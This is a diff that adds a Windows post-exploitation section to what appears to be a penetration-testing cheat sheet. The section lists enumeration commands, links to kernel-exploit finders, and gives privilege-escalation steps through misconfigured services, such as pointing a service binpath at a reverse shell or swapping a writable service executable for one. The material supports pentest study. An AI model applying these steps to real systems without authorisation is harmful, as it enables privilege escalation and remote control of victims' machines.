@@ -553,6 +553,55 @@ Post Exploitation Windows
 
 <br>
 
+`Manual`
+
+         whoami /priv | /groups | /all  
+         systeminfo  
+         hostname  
+         net users | net user <user>  
+         set  
+         tasklist /SCV  |  tasclist /v   
+
+<br>
+
+`Kernel Exploits`  
+
+-    [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)  
+-    [Secwiki](https://github.com/SecWiki/windows-kernel-exploits)  
+-    [Sherlock](https://github.com/rasta-mouse/Sherlock)  
+
+<br>
+
+`Service Exploits`  
+
+ -   Insecure Service Properties  
+
+         SERVICE_START & SERVICE_STOP & SERVICE_CHANGE_CONFIG  
+         sc qc <service>
+         sc query <service>
+         sc config <service> binpath= "\"C:\<reverse_shell>\""
+         listener on kali + START/STOP SERVICE
+         
+-    Unquoted Service Path  
+     
+         SERVICE_START & SERVICE_STOP + unquoted service path
+         
+-    Weak Registry Permissions  
+
+         reg query <full path to service>  
+         
+-    Insecure Service Executables  
+
+         check winpeas for writeable service executable  
+         replace file with reverse shell
+         
+-    DLL Hijacking  
+
+         Check all services winpeas recognizes 1 by 1
+         sc qc <service>
+
+<br>
+
 Active Directory
 ===============================================================================================
 
